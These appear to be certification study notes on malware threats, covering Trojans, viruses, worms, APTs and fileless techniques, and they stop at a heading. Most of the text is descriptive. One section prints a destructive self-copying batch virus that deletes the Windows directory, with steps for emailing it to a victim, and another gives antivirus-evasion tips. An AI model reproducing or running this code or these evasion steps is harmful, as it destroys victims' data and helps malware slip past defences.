# Module 07: Malware Threats

{% hint style="info" %}
**Objectives**

* Understanding Malware and Malware Propagation Techniques 
* Understanding Advanced Persistent Threats \(APTs\) and their Lifecycle
* Overview of Trojans, Their Types, and How they Infect Systems 
* Overview of Viruses, Their Types, and How They Infect Files 
* Overview of Computer Worms and Fileless Malware 
* Understanding the Malware Analysis Process 
* Understanding Different Techniques to Detect Malware 
* Understanding Different Malware Countermeasures
{% endhint %}

## 1. Malware Concepts

Malware is malicious software that _damages or disables computer systems_ and _gives limited or full control_ of the systems to the malware creator for the purpose of theft or fraud.

Malware programmers develop and use malware to:

* Attack browsers and track websites visited 
* Slow down systems and degrade system performance 
* Cause hardware failure, rendering computers inoperable 
* Steal personal information, including contacts 
* Erase valuable information, resulting in substantial data loss 
* Attack additional computer systems directly from a compromised system 
* Spam inboxes with advertising emails

Examples: Trojans, Backdoors, Rootkits, Ransomware, Adware, Viruses, Worms, Spyware, Botnets, Crypters.

### Different Ways for Malware to Enter a System

* Instant Messenger applications
* Portable hardware media/removable devices 
* Browser and email software bugs 
* Insecure patch management 
* Rogue/decoy applications
* Untrusted sites and freeware web applications/software
* Email attachments 
* Network propagation 
* File sharing services \(NetBIOS, FTP, SMB\) 
* Installation by other malware 
* Bluetooth and wireless networks 

### Common Techniques Attackers Use to Distribute Malware on the Web

* **Black hat Search Engine Optimization \(SEO\)**: Ranking malware pages highly in search results 
* **Social Engineered Click-jacking**: Tricking users into clicking on innocent-looking webpages 
* **Spear-phishing Sites**: Mimicking legitimate institutions in an attempt to steal login credentials 
* **Malvertising**: Embedding malware in ad-networks that display across hundreds of legitimate, high-traffic sites 
* **Compromised Legitimate Websites**: Hosting embedded malware that spreads to unsuspecting visitors 
* **Drive-by Downloads**: Exploiting flaws in browser software to install malware just by visiting a web page 
* **Spam Emails**: Attaching the malware to emails and tricking victims to click the attachment 

### Components of Malware

* **Crypter**: Software that protects malware from undergoing reverse engineering or analysis, thus making the task of the security mechanism harder in its detection.
* **Downloader**: A type of Trojan that downloads other malware from the Internet on to the PC. Usually, attackers install downloader software when they first gain access to a system
* **Dropper**: A type of Trojan that covertly installs other malware files on to the system 
* **Exploit**: A malicious code that breaches the system security via software vulnerabilities to access information or install malware
* **Injector**: A program that injects its code into other vulnerable running processes and changes how they execute to hide or prevent its removal
* **Obfuscator**: A program that conceals its code and intended purpose via various techniques, and thus, makes it hard for security mechanisms to detect or remove it
* **Packer**: A program that allows all files to bundle together into a single executable file via compression to bypass security software detection
* **Payload**: A piece of software that allows control over a computer system after it has been exploited 
* **Malicious Code**: A command that defines malware’s basic functionalities such as stealing data and creating backdoors

## 2. APT Concepts

Advanced persistent threats are a major security concern for any organization, as they represent threats to the organization’s assets, resources, financial records, and other confidential data. APT attacks can damage the reputation of an organization by revealing sensitive data.

* Advanced persistent threats \(APTs\) are defined as a **type of network attack, where an attacker gains unauthorized access to a target network and remains undetected for a long period of time**.
* The main objective behind these attacks is to obtain sensitive information rather than sabotaging the organization and its network.

APT:

* The word “advanced” signifies the use of techniques to exploit the underlying vulnerabilities in the system. 
* The word “persistent” signifies the external command-and-control \(C&C\) system that continuously extracts the data and monitors the victim’s network. - The word “threat” signifies human involvement in coordination.

These attacks involve well-planned and coordinated techniques whereby attackers erase evidence of their malicious activities after their objectives have been fulfilled.

Information obtained by an attacker through APT attacks includes:

* Classified documents 
* User credentials 
* Employee’s or customer’s personal information
* Transaction information 
* Credit card information 
* Organization’s business strategy information
* Network information 
* Control system access information 

### Characteristics of APT

* **Objectives**: The main objective of any APT attack is to repeatedly obtain sensitive information by gaining access to the organization’s network for illegal earnings. Another objective of an APT may be spying for political or strategic goals.
* **Timeliness**: It refers to the time taken by an attacker from assessing the target system for vulnerabilities to exploiting them to gain and maintain access to the target system.
* **Resources**: It is defined as the amount of knowledge, tools, and techniques required to perform an attack. APT attacks are more sophisticated attacks performed by highly skilled cyber-criminals, and they require considerable resources.
* **Risk Tolerance**: It is defined as the level up to which the attack remains undetected in the target network. APT attacks are well planned and executed with proper knowledge of the target network, which helps them remain undetected in the network for a long time.
* **Skills and Methods**: These are the methods and tools used by attackers to perform a certain attack. The methods used for performing the attack include various social engineering techniques to gather information about the target, techniques to prevent detection by security mechanisms, and techniques to maintain access for a long time.
* **Actions**: APT attacks follow a certain number of technical “actions” that make them different from other types of cyber-attacks. The main objective of such attacks is to maintain their presence in the victim’s network for a long time and extract as much data as possible.
* **Attack Origination Points**: They refer to the numerous attempts made to gain entry into the target network. Such

  points of entry can be used to gain access to the network and launch further attacks. To succeed in gaining initial access, the attacker needs to conduct exhaustive research to identify the vulnerabilities and gatekeeper functions in the target network.

* **Numbers Involved in the Attack**: It is defined as the number of host systems involved in the attack. APT attacks are usually performed by a crime group or crime organization.
* **Knowledge Source**: It is defined as the gathering of information through online sources about specific threats, which can be further exploited to perform certain attacks.
* **Multi-phased**: One of the important characteristics of APTs is that they follow multiple phases to execute an attack. The phases followed by an APT attack are reconnaissance, access, discovery, capture, and data exfiltration.
* **Tailored to the Vulnerabilities**: The malicious code used to execute APT attacks is designed and written such that it targets the specific vulnerabilities present in the victim’s network. 
* **Multiple Points of Entries**: Once an adversary enters the target network, he/she establishes a connection with the server to download malicious code for further attacks. In the initial phase of an APT attack, the adversary creates multiple points of entry through the server to maintain access to the target network. If one point of entry is discovered and patched by the security analyst, then the adversary can use a different entry point.
* **Evading Signature-Based Detection Systems**: APT attacks are closely related to zero-day exploits, which contain malware that has never been previously discovered or deployed. Thus, APT attacks can easily bypass security mechanisms such as firewalls, antivirus software, IDS/IPS, and email spam filters.
* **Specific Warning Signs**: APT attacks are usually impossible to detect. However, some indications of an attack include inexplicable user account activities, the presence of a backdoor Trojan for maintaining access to the network, unusual file transfers and file uploads, unusual database activities, etc.

### Advanced Persistent Threat Lifecycle

1. Preparation
2. Define target
3. Research target
4. Organize team
5. Build or attain tools
6. Test for detection
7. Initial Intrusion
8. Deployment of malware
9. Establishment of outbound connection
10. Expansion 
11. Expand access
12. Obtain credentials
13. Persistence   
14. Maintain access
15. Search and Exfiltration 
16. Exfiltration data
17. Cleanup
18. Covering tracks
19. Remain undetected

## 3. Trojan Concepts

1. It is a program in which the malicious or harmful code is contained inside apparently harmless programming or data in such a way that the code can get control and cause damage, such as ruining the file allocation table on your hard disk.
2. Trojans get activated when a user performs certain predefined actions and upon activation. It can grant attackers unrestricted access to all the data stored on compromised information systems and can cause immense damage to the systems.
3. Indications of a Trojan attack include abnormal system and network activities such as disabling of antivirus and redirection to unknown pages.
4. Trojans create a covert communication channel between the victim computer and the attacker for transferring sensitive data.

### How Hackers Use Trojans

Attackers create malicious programs such as Trojans for the following purposes:

* Delete or replace OS’s critical files 
* Generate fake traffic to perform DoS attacks 
* Record screenshots, audio, and video of victim’s PC 
* Use victim’s PC for spamming and blasting email messages 
* Download spyware, adware, and malicious files 
* Disable firewalls and antivirus 
* Create backdoors to gain remote access 
* Infect the victim’s PC as a proxy server for relaying attacks 
* Use the victim’s PC as a botnet to perform DDoS attacks 
* Steal sensitive information such as: o Credit card information, which is useful for domain registration as well as for shopping using keyloggers
  * Account data such as email passwords, dial-up passwords, and web service passwords
  * Important company projects, including presentations and work-related papers
* Encrypt the victim’s machine and prevent the victim from accessing the machine 
* Use the target system as follows:
  * To store archives of illegal materials, such as child pornography. The target continues using his/her system without realizing that attackers are using it for illegal activities
  * As an FTP server for pirated software
* Script kiddies may just want to have fun with the target system; an attacker could plant a Trojan in the system just to make the system act strangely \(e.g., the CD\DVD tray opens and closes frequently, the mouse functions improperly, etc.\)
* The attacker might use a compromised system for other illegal purposes such that the target would be held responsible if these illegal activities are discovered by the authorities

### Common Ports used by Trojans

| Port | Trojan |
| :--- | :--- |
| 20/22/80/443 | Emotet |
| 21 | Blade Runner, DarkFTP |
| 22 | SSH RAT, Linux Rabbit |
| 23 | EliteWrap |
| 68 | Mspy |
| 80 | Ismdoor, Poison Ivy, POWERSTATS |
| 443 | Cardinal RAT, gh0st RAT, TrickBot |
| 445 | WannaCry, Petya |
| 1177 | njRAT |
| 1604 | DarkComet RAT, Pandora RAT |
| 1807 | SpySender |
| 1863 | XtremeRAT |
| 2140/3150/6670-71 | Deep Throat |
| 5000 | SpyGate RAT, Punisher RAT |
| 5400-02 | Blade Runner |
| 6666 | KilerRat, Houdini RAT |
| 6667/12349 | Bionet, Magic Hound |
| 6969 | GateCrasher, Priority |
| 7000 | Remote Grab |
| 7789 | ICKiller |
| 8080 | Trojan Zeus, Shamoon |
| 8787 / 54321 | BackOfrice 2000 |
| 10048 | Delf |
| 10100 | Gift |
| 11000 | Senna Spy |
| 11223 | Progenic Trojan |
| 12223 | Hack ́99 KeyLogger |
| 23456 | Evil FTP, Ugly FTP |
| 31337-38 | Back Orifice/ Back Orifice 1.20/ Deep BO |
| 65000 | Devil |

### Types of Trojans

Trojan are classified into many categories depending on the exploit functionality targets.

Some Trojans types are listed below:

1. Remote Access Trojans 
2. Backdoor Trojans 
3. Botnet Trojans 
4. Rootkit Trojans 
5. E-Banking Trojans 
6. Point-of-Sale Trojans 
7. Defacement Trojans 
8. Service Protocol Trojans 
9. Mobile Trojans 
10. IoT Trojans 
11. Security Software Disabler Trojans 
12. Destructive Trojans 
13. DDoS Attack Trojans 
14. Command Shell Trojans

### How to Infect Systems Using a Trojan

STEP 1: Create a new Trojan packet STEP 2: Employ a dropper or downloader to install the malicious code on the target system STEP 3: Employ a wrapper to bind the Trojan to a legitimate file STEP 4: Employ a crypter to encrypt the Trojan STEP 5: Propagate the Trojan by various methods STEP 6: Deploy the Trojan on the victim’s machine by executing dropper or downloader on the target machine STEP 7: Execute the damage routine

### Creating a Trojan

* Trojan Horse construction kits help attackers to construct Trojan horses of their choice 
* The tools in these kits can be dangerous and can backfire if not properly executed

#### Trojan Horse Construction Kits

* Trojan Horse Construction Kit 
* Senna Spy Trojan Generator 
* Batch Trojan Generator
* Umbra Loader - Botnet Trojan Maker
* DarkHorse Trojan Virus Maker: DarkHorse Trojan virus maker creates user-specified Trojans by selecting from various options

### Employing a Dropper or Downloader

#### Droppers

* Dropper is used to camouflage the malware payloads that can impede the functioning of the targeted systems
* Dropper consists of one or more types of malware features that can make it undetectable by antivirus software; also the installation process can be done stealthy
* Emotet dropper and Dridex dropper are some of the famous droppers that attackers employ for deploying malware to the target machine

#### Downloaders

* Downloader is a program that can download and install harmful programs like malware
* Downloader does not carry malware of itself as dropper does, so there is the possibility for a new unknown downloader to pass through the anti-malware scanner
* Godzilla Downloader and Trojan.Downloader are some of the famous downloaders that attackers employ for deploying malware to the target machine

### Employing a Wrapper

* A wrapper binds a Trojan executable with genuine looking .EXE applications, such as games or office applications
* When the user runs the wrapped .EXE, it first installs the Trojan in the background and then runs the wrapping application in the foreground
* Attackers might send a birthday greeting that will install a Trojan as the user watches, for example, a birthday cake dancing across the screen

Wrappers:

* Elite Wrap 
* Advanced File Joiner 
* Soprano 3 
* Exe2vbs 
* Kriptomatik
* _IExpress Wizard_: IExpress Wizard wrapper guides the user to create a self-extracting package that can automatically install the embedded setup files, Trojans, etc.

### Employing a Crypter

Crypter is software used by hackers to hide viruses, keyloggers or tools in any kind of file, so that they do not easily get detected by antiviruses

Crypters:

* SwayzCryptor 
* AegisCrypter v1.5 
* Hidden Sight Crypter 
* Battleship Crypter 
* Heavens Crypter 
* Cypherx
* BitCrypter: BitCrypter can be used to encrypt and compress 32-bit executables and .NET apps without affecting their direct functionality

### Propagating and Deploying a Trojan

#### Deploy a Trojan through Emails

A Trojan is the means by which an attacker can gain access to the victim's system. To gain control over the victim's machine, the attacker creates a Trojan server and then sends an email that lures the victim into clicking on a link provided within the email. As soon as the victim clicks the malicious link sent by the attacker, it connects directly to the Trojan server. The Trojan server then sends a Trojan to the victim system, which undergoes automatic installation on the victim’s machine and infects it. As a result, the victim’s device establishes a connection with the attack server unknowingly. Once the victim connects to the attacker's server, the attacker can take complete control of the victim’s system and perform any action. If the victim carries out an online transaction or purchase, then the attacker can easily steal sensitive information such as the victim’s credit card details and account information. In addition, the attacker can use the victim's machine to launch attacks on other systems.

The Trojan may infect computers when users open an email attachment that installs the Trojan on their computers, which might serve as a backdoor for criminals to access the system later.

#### Deploy a Trojan through Covert Channels

* Attackers use covert channels to deploy and hide malicious Trojans in an undetectable protocol
* Covert channels operate on a tunneling method and are mostly employed by attackers to evade firewalls that are deployed in the target network
* Attackers can create covert channels using various tools such as Ghost Tunnel V2, and ELECTRICFISH – a North Korean tunneling tool

#### Deploy a Trojan through Proxy Servers

* Attackers compromise several computers using a Trojan proxy and start using them as hidden proxy servers
* The attackers have full control over the proxy victim’s systems and can launch attacks on other systems from an affected user’s network 
* Attackers use this to anonymously propagate and deploy the Trojan on to the target computer 
* If the authorities detect illegal activity, the footprints lead to innocent users 
* Thousands of machines on the Internet are infected with proxy servers

#### Deploy a Trojan through USB/Flash Drives

* Attackers drop the USB drives on the pathway and wait for random victims to pick them up
* Once the USB drive is picked up and inserted in the target system by the innocent victim, the Trojan is propagated onto the system and is automatically executed, thus infecting and compromising the system and network

#### Techniques for Evading Antivirus Software

* Break the Trojan file into multiple pieces and zip them as a single file ALWAYS write your own Trojan, and embed it into an application
* Change the Trojan’s syntax: 
  * Convert an EXE to VB script
  * Change .EXE extension to .DOC.EXE, .PPT.EXE or .PDF.EXE \(Windows hides “known extensions” by default, so it shows up only as .DOC, .PPT and .PDF\)
* Change the content of the Trojan using hex editor and also change the checksum and encrypt the file 
* Never use Trojans downloaded from the web \(antivirus can detect these easily\)

### Exploit Kits

* An exploit kit or crimeware toolkit is a platform to deliver exploits and payloads such as Trojans, spywares, backdoors, bots, and buffer overflow scripts to the target system
* Exploit kits come with pre-written exploit codes and therefore can be easily used by an attacker, who is not an IT or security expert
* **RIG Exploit Kit**: RIG EK was used by attackers for distributing Cryptobit, CryptoLuck, CryptoShield, Cryptodefense, Sage, Spora, Revenge, PyCL, Matrix, Philadelphia, and Princess Ransomwares. RIG EK was also used in distributing LatentBot, Pony and Ramnit Trojans.
* Magnitude 
* Angler 
* Neutrino 
* Terror 
* Sundown

## 4. Virus and Worm Concepts

* A virus is a self-replicating program that produces its own copy by attaching itself to another program, computer boot sector or document
* Viruses are generally transmitted through file downloads, infected disk/flash drives, and as email attachments
* Indications of a virus attack include constant antivirus alerts, suspicious hard drive activity, lack of storage space, unwanted pop-up windows, etc. 

### Characteristics of Viruses

The performance of a computer is affected by a virus infection.

This infection can lead to data loss, system crash, and file corruption.

Some of the characteristics of a virus are as follows:

* Infects other programs 
* Transforms itself 
* Encrypts itself 
* Alters data
* Corrupts files and programs 
* Replicates itself

### Purpose of Creating Viruses

An attacker creates a virus for the following purposes:

* Inflict damage on competitors 
* Realize financial benefits 
* Vandalize intellectual property 
* Play pranks 
* Conduct research 
* Engage in cyber-terrorism 
* Distribute political messages 
* Damage network or computers 
* Gain remote access to the victim's computer

### Indications of Virus Attack

Indications of virus attacks arise from abnormal activities. Such activities reflect the nature of a virus by interrupting the regular flow of a process or a program. However, not all bugs created contribute toward attacking the system; they may be merely false positives. For example, if the system runs slower than usual, one may assume that a virus has infected the system; however, the actual reason might be program overload.

Some indications of computer virus infection are as follows:

* Processes require more resources and time, resulting in degraded performance 
* Computer beeps with no display 
* Drive label changes and OS does not load 
* Constant antivirus alerts 
* Computer freezes frequently or encounters an error such as BSOD 
* Files and folders are missing
* Suspicious hard drive activity 
* Browser window “freezes” 
* Lack of storage space 
* Unwanted advertisements and pop-up window

### Stages of Virus Lifecycle

1. **Design**: Development of virus code using programming languages or construction kits.
2. **Replication**: The virus replicates for a period within the target system and then spreads itself.
3. **Launch**: The virus is activated when the user performs specific actions such as running an infected program.
4. **Detection**: The virus is identified as a threat infecting target system. 
5. **Incorporation**: Antivirus software developers assimilate defenses against the virus.
6. **Execution of the damage routine**: Users install antivirus updates and eliminate the virus threats.

### Types of Viruses

* Viruses are categories according to their functioning and targets Some of the example includes:
* System or Boot Sector Virus 
* File and Multipartite Virus
* Macro and Cluster Virus 
* Stealth/Tunneling Virus 
* Encryption Virus
* Sparse Infector Virus
* Polymorphic Virus 
* Metamorphic Virus
* Overwriting File or Cavity Virus
* Companion/Camouflage Virus 
* Shell and File Extension Virus
* FAT and Logic Bomb Virus
* Web Scripting Virus 
* Email and Armored Virus 
* Add-on and Intrusive Virus 
* Direct Action or Transient Virus 
* Terminate & Stay Resident Virus

### Ransomware

Ransomware is a type of malware that restricts access to the computer system’s files and folders and demands an online ransom payment to the malware creator\(s\) to remove the restrictions.

Ransomware Families:

* Cerber 
* CTB-Locker 
* Sodinokibi 
* BitPaymer 
* CryptXXX 
* Cryptorbit ransomware 
* Crypto Locker Ransomware 
* Crypto Defense Ransomware 
* Crypto Wall Ransomware
* Dharma: Dharma is a dreadful ransomware that attacks victims through email campaigns; the ransom notes ask the victims to contact the threat actors via a provided email address and pay in bitcoins for the decryption service
* eCh0raix: eCh0raix is a new ransomware that specifically targets Linux devices with QNAP Network Attached Storages \(NAS\) by employing the AES encryption technique
* SamSam: SamSam is a notorious ransomware that has infected millions of unpatched servers by employing the RSA-2048 asymmetric encryption technique

Some additional ransomware are as follows:

* WannaCry 
* Petya - NotPetya 
* GandCrab 
* MegaCortex 
* LockerGoga 
* NamPoHyu 
* Ryuk 
* Cryptgh0st

### How to Infect Systems Using a Virus

Attackers can infect systems using a virus in the following steps:

* Creating Virus 
* Propagating and Deploying Virus

Creating a Virus A virus can be created in two ways: writing a virus program, and using virus maker tools.

#### Writing a Simple Virus Program:

The following steps are involved in writing a simple virus program:

1. Create a batch file Game.bat with the following text: 

```text
@ echo off 
for %%f in (*.bat) do copy %%f + Game.bat 
del c:\Windows\*.*
```

1. Convert the Game.bat batch file into Game.com using the bat2com utility 
2. Send the Game.com file as an email attachment to the victim
3. When Game.com is executed by the victim, it copies itself to all the .bat files in the current directory on the target machine and deletes all the files in the Windows directory

#### Using Virus Maker Tools

Virus maker tools allow you to customize and craft your virus into a single executable file. The nature of the virus depends on the options available in the virus maker tool.

Once the virus file is built and executed, it can perform the following tasks:

* Disable Windows command prompt and Windows Task Manager 
* Shut down the system o Infect all executable files 
* Inject itself into the Windows registry and start up with Windows 
* Perform non-malicious activity such as unusual mouse and keyboard actions 

The following tools are useful for testing the security of your own antivirus software.

* DELmE’s Batch Virus Maker
* JPS Virus Maker
* Bhavesh Virus Maker SKW  
* Deadly Virus Maker  
* SonicBat Batch Virus Maker  
* TeraBIT Virus Maker  
* Andreinick05's Batch Virus Maker

### Computer Worms

* Computer worms are malicious programs that independently replicate, execute, and spread across the network connections, thus consuming available computing resources without human interaction.
* Attackers use worm payloads to install backdoors in infected computers, which turns them into zombies and creates a botnet; these botnets can be used to perform further cyber attacks.
* Worms are a subtype of viruses. A worm does not require a host to replicate; however, in some cases, the worm’s host machine is also infected. Initially, black hat professionals treated worms as a mainframe problem. Later, with the introduction of the Internet, they mainly focused on and targeted Windows OS using the same worms by sharing them in via e-mail, IRC, and other network functions.
* Worm examples: Monero, Bondat, Beapy.

#### How is a Worm Different from a Virus?

1. A Worm Replicates on its own: A worm is a special type of malware that can replicate itself and use memory but cannot attach itself to other programs.
2. A Worm Spreads through the Infected Network: A worm takes advantage of file or information transport features on computer systems and automatically spreads through the infected network but a virus does not.\

| Virus | Worm |
| :--- | :--- |
| A virus infects a system by inserting itself into a file or executable program | A worm infects a system by exploiting a vulnerability in an OS or application by replicating itself |
| It might delete or alter the content of files or change the location of files in the system | Typically, a worm does not modify any stored programs; it only exploits the CPU and memory |
| It alters the way a computer system operates without the knowledge or consent of a user | It consumes network bandwidth, system memory, etc., excessively overloading servers and computer systems |
| A virus cannot spread to other computers unless an infected file is replicated and sent to the other computers | A worm can replicate itself and spread using IRC, Outlook, or other applicable mailing programs after installation in a system |
| A virus spreads at a uniform rate, as programmed | A worm spreads more rapidly than a virus |
| Viruses are difficult to remove from infected machines | Compared with a virus, a worm can be removed easily from a system |

#### Worm Makers

* Internet Worm MakerThing
* Batch Worm Generator 
* C++ Worm Generator

## 5. Fileless Malware Concepts

* Fileless malware, also known as non-malware, infects legitimate software, applications, and other protocols existing in the system to perform various malicious activities.
* It leverages any existing vulnerabilities to infect the system.
* It resides in the system’s RAM. It injects malicious code into the running processes such as Microsoft Word, Flash, Adobe PDF Reader, Javascript, and PowerShell.

### Reasons for using fileless malware in cyber-attacks

* **Stealth**: Fileless malware exploits legitimate system tools; hence, it is extremely difficult to detect, block, or prevent fileless attacks.
* **LOL \(Living-off-the-land\)**: System tools exploited by fileless malware are already installed in the system by default. An attacker does not need to create and install custom tools on the target system.
* **Trustworthy**: The system tools used by fileless malware are the most frequently used and trusted tools; hence, security tools incorrectly assume that such tools are running for a legitimate purpose.

### Fileless Techniques used by Attackers

* **Phishing emails**: Attackers use phishing emails embedded with malicious links or downloads, which, when clicked, inject and run malicious code in the victim’s memory.
* **Legitimate applications**: Attackers exploit legitimate system packages installed in the system, such as Word, and JavaScript, to run the malware.
* **Native applications**: Operating systems such as Windows include pre-installed tools such as PowerShell, Windows Management Instrumentation \(WMI\). Attackers exploit these tools to install and run malicious code.
* **Infection through lateral movement**: Once the fileless malware infects the target system, attackers use this system to move laterally in the network and infect other systems connected to the network.
* **Malicious websites**: Attackers create fraudulent websites that appear legitimate. When a victim visits such a website, it automatically scans the victim’s system to detect vulnerabilities in plugins that can be exploited by the attackers to run malicious code in the browser’s memory.
* **Registry manipulation**: Attackers use this technique to inject and run malicious code directly from the Windows registry through a legitimate system process. This helps attackers to bypass UAC, application whitelisting, etc., and also infect other running processes.
* **Memory code injection**: Attackers use this technique to inject malicious code and maintain persistence in the process memory of the running process with the aim of propagating and re-injecting it into other legitimate system processes that are critical for normal system operation. This helps in bypassing regular security controls. The various code injection techniques used by attackers include local shellcode injection, remote thread injection, process hallowing, etc.
* **Script-based injection**: Attackers often use scripts in which the binaries or shellcode are obfuscated and encoded. Such script-based attacks might not be completely fileless. The scripts are often embedded in documents as email attachments.

### Taxonomy of Fileless Malware Threats

Fileless malware can be categorized based on their point of entry, i.e., how the malware creates an entry point into the target system. Fileless malware enters the target system through an exploit or compromised hardware or by the normal execution of applications or scripts.

According to the above categorization, fileless malware threats are of three types based on how much evidence they leave on the victim’s machine:

* **Type 1**: No File Activity Performed This type of malware never requires writing a file onto the disk. An example of such an infection is receiving malicious packets that exploit a vulnerability in a target host that automatically installs a backdoor in the kernel memory. Another example may involve malicious code embedded within the compromised device’s firmware. Anti-malware solutions are not capable of checking a device’s firmware. Hence, it is extremely difficult to detect and prevent such threats.
* **Type 2**: Indirect File Activity

  This type of malware achieves fileless presence on the target machine using files. For example, an attacker can inject a malicious PowerShell command into the WMI repository to configure a filter that executes periodically.

* **Type 3**: Required Files to Operate

  This type of malware requires files to operate, but it does not execute attacks from those files directly. For example, an attacker exploits a document with an embedded macro, Java/Flash file, or EXE file to inject malicious payloads into the target host and then maintains persistence without using any files.

Classification of fileless malware threats based on their point of entry:

* **Exploits**: Exploits can be either file-based or network-based. File-based malware exploits the system executables, Flash, Java, documents, etc., to run a shellcode that injects a malicious payload into the memory. This type of malware uses files to make an initial entry into the target machine. Network-based malware exploits vulnerabilities in network communication protocols such as SMB to deliver malicious payloads.
* **Hardware**: Device-based malware infects the firmware residing on network cards and hard disks to deliver the malicious payload. CPU-based malware exploits firmware used for management operations to execute malicious code within the CPU. USB-based malware rewrites the USB firmware with malicious code that directly interacts with the operating system and installs malicious payload on the target machine. Similarly, fileless malware can also exploit BIOS-based firmware or perform hypervisor-based attacks that exploit virtual machines.
* **Execution and Injection**: This type of malware can be file-based, macro-based, script-based, or disk-based. File-based malware exploits executables, DLLS, LNK, files, etc., to inject a malicious payload into the process memory or other legitimate running processes. Using macro-based malware, attackers trick victims into clicking malicious links that execute macros automatically to inject a malicious payload into the process memory. Attackers implement script-based malware if they gain an initial footprint on the target system. The attacker injects malicious payload by running a malicious script on the command prompt. Disk-based malware rewrites the boot record with malicious code, which, when executed, gains access and installs the malicious payload.

### How does Fileless Malware Work

![](../.gitbook/assets/image%20%2830%29.png)

#### Point of Entry

* Memory Exploits: Fileless malware uses a variety of techniques to inject and execute itself in the process memory of a legitimate system process. It exploits the memory and privileges of whitelisted system tools such as Windows Management Instrumentation \(WMI\), PowerShell, Command.exe, PsExec, etc.
* Malicious Website: Fileless threats may also arrive from exploit-hosting websites that appear to be legitimate business pages. When the user visits the page, the exploit kit starts scanning for vulnerabilities, such as any outdated Flash or Java plugins. If successful, it invokes Windows native tools such as PowerShell to download and execute the payload directly in the memory without writing any files to the disk. Fileless malware can also exploit script-based programs such as PowerShell, Macros, JavaScript, and VBScript. The initial script might be used for code injection or to connect to other malicious sites to download more binaries/scripts to deliver the actual payload.
* Phishing Email/Malicious Documents: Attackers can also embed malicious macros in the form of VBScript or JavaScript in a Microsoft Office document \(Word, PowerPoint, Excel\) or PDF, and further use social engineering techniques to get users to run the macros on their systems. Here, the attack initiates with a document or file but transforms into a fileless threat when the malicious script is executed from memory using whitelisted tools such as PowerShell.

#### Code Execution

* **Code Injection**: Fileless threats can use various code injection techniques such as process hollowing and reflective DLL injection, which directly load the shellcode into the memory without writing any file to the disk.
* **Script-based Injection**: Fileless malware often comes embedded in a document as an email attachment. Once the document is opened, the malicious script runs in the memory, thus turning into a fileless operation. The script then invokes whitelisted applications, such as PowerShell, mshta.exe, JavaScript, WScript, and VBscript, to connect to one or more malicious websites to download additional scripts to deliver the actual payload. All these operations occur in memory, which makes it difficult for traditional anti-malware solutions to detect them.

#### Persistence

In general, fileless malware is not persistent in nature. As it is memory-based, restarting the system would remove the malicious code from memory and stop the infection. However, depending on the goal of the attacker, malicious scripts can be stored in various Windows built-in tools and utilities such as Windows registry, WMI, and Windows Task Scheduler, and be set to run even after a system reboot.

* **Windows Registry**: Attackers can store the malicious scripts in the Windows AutoStart registry keys so that they are loaded and executed whenever the machine is restarted.
* **Windows Management Instrumentation \(WMI\)**: Fileless malware also abuses WMI, which is commonly used for automating system administration tasks, to achieve and maintain persistence. In this case, attackers store the malicious scripts in the WMI repositories that are periodically triggered via WMI bindings.
* **Windows Task Scheduler**: Using a task scheduler, attackers can set malicious scripts to be automatically triggered and executed in a chosen time interval.

#### Achieving Objectives

By maintaining persistence, attackers bypass security solutions and achieve a variety of objectives, such as data exfiltration, credential stealing, reconnaissance, and cyber-spying, on the target systems and network.

### Launching Fileless Malware through Document Exploits

An attacker can trick users into downloading documents, archives, PDFs, or other attractive files consisting of malicious macro code, which are sent via phishing emails or accepted via social engineering tricks. Once the file is opened, the malicious macro launches VBA \(VisualBasic\) or JavaScript to exploit the Windows default tools such as PowerShell. Then, the malicious script uses PowerShell to run additional code or payload to continue the infection without being traced. The malicious script can either exploit PowerShell to get access to local storage files to run the executables or simply execute the malicious payload in memory. Once the malicious code or payload inside the document is successfully executed, it disguises itself as a legitimate dropper or downloader to continue the chain of infection that can be leveraged by an attacker to launch further attacks.

A fileless malware can be launched through document exploits in the following steps:

* The victim is tricked into downloading/running a malicious document 
* The document runs a malicious macro 
* The malicious macro launches VBA or JavaScript 
* The malicious script exploits PowerShell to run additional code \(payload\) to spread the infection to other running processes or systems

### Launching Fileless Malware through In-Memory Exploits

* Attackers inject a malicious payload into the RAM that targets the legitimate process without leaving any footprints
* Attackers exploit different Windows APIs such as WMI, PSExec, or PowerShell to gain access over the process memory of a legitimate process

Attackers can inject malicious payload inside the running memory \(RAM\) that targets legitimate processes without leaving any footprints. Such intrusion is extremely difficult to be detected by any antivirus software, as the payload is not stored in local disks but is directly executed from memory. Attackers exploit different APIs or Windows admin tools such as Windows Management Instrumentation \(WMI\), PSExec, and PowerShell to gain access to the process memory of a legitimate process. Attackers employ a reflective Dynamic Link Library \(DLL\) method to load a malicious script into a host-side process that resists the writing of DLLs to the disk.

EternalBlue is a type of in-memory exploit that can leverage the flaws in the Windows file sharing protocol known as Server Message Block \(SMB 1\). This client-server communication protocol \(SMB 1\) allows an attacker to read access services, applications etc. The attacker then targets the local security authority subsystem service \(lsass.exe\) file, injecting malicious code. The file \(lsass.exe\) is designed to handle login-logout validating user credentials, and it also performs other critical operations. The attacker exploits this file to launch further attacks while evading security using tools such as Mimikatz to access the details from memory.

### Launching Fileless Malware through Script-based Injection

Fileless attacks are also performed using scripts whereby binaries and shellcode are embedded, obfuscated, and compiled to avoid file creation on the disk. Scripts allow attackers to communicate with and infect applications or operating systems without being traced. They are also useful in finding design flaws and vulnerabilities in the applications. Scripts are usually flexible, and they can be executed from any files or directly from memory. The attacker leverages this feature along with the vulnerabilities in a system to inject malicious scripts directly into the memory via PowerShell to evade detection. Once the attacker gains control of the target system, he/she can execute these scripts directly on a command-line interface from a remote location to spread infections and initiate other malicious activities. Many classical fileless threats such as KOVET, POWMET, and FAREIT have used malicious scripts to spread malware.

#### Launching Fileless Malware by Exploiting System Admin Tools

The attacker exploits default system admin tools, features, and other utilities of a system to spread fileless infections. Attackers use Certutil and Windows Management Interface Command \(WMIC\) utilities to steal the information. They also exploit command-line tools such as Microsoft registered server \(Regsvr32\) and runddl32, to run malicious DLLs. The exploited command lines enable the attacker to install altered versions of pen testing tools to gain complete access to the target system. The modified tools are used to access payloads, maintain persistence, steal and export information, and expand malware. As they appear to be authentic tools, they can evade the security mechanism of any traditional antivirus software. An attacker can exploit system tools such as remote desktops, command-oriented tools such as regsvr32, PowerShell, rundll32, certUtil, and WMIC, and pen testing tools such as Mimikatz, and Cobalt strike. Using this technique, attackers can steal critical information from the system, such as credentials, to launch further attacks.

#### Launching Fileless Malware through Phishing

